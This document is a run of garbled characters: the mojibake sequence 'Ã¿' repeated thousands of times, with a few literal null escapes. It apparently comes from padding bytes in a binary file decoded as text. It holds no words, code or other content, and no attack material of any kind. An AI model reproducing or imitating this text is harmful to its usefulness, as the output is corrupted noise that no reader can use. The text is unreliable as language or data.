¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿